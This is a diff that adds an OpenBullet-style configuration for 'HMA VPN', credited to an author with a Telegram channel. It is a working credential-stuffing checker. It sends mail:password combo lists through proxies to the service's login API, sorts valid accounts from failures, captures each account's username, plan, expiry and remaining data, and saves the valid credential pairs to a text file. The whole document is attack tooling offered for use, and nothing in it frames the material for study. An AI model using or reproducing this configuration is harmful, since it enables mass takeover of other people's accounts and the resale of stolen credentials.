@@ -1,0 +1,68 @@
+[SETTINGS]
+{
+  "Name": "HMA VPN",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-11-17T04:43:23.2741504-08:00",
+  "AdditionalInfo": "Telegram Channel : T.me/ghoulblack",
+  "RequiredPlugins": [],
+  "Author": "👑LilTOBA👑",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Post REQUEST POST "https://securenetconnection.com/clapi/v1.5/user/login" 
+  CONTENT "username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username/password combination" 
+  KEYCHAIN Success OR 
+    KEY "\"plan\":" 
+  KEYCHAIN Retry OR 
+    KEY "Error has occurred" 
+
+#UserName PARSE "<SOURCE>" LR "\"user\":\"" "\"," -> CAP "UserName" 
+
+#Plan PARSE "<SOURCE>" LR "\",\"plan\":\"" "\",\"" -> CAP "Plan" 
+
+#Renew PARSE "<SOURCE>" LR "\",\"expires\":\"" "T" -> CAP "Renew" 
+
+#Data_remaining PARSE "<SOURCE>" LR "\",\"remaining\":" "}}" -> CAP "Data remaining" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"plan\":\"\"" 
+    KEY "\"plan\":\"Free Trial\"" 
+    KEY "\",\"expires\":\"1970-01-01" 
+
+UTILITY File "HMA.txt" AppendLines "<USER>: <PASS> //\\n =============================" 
+
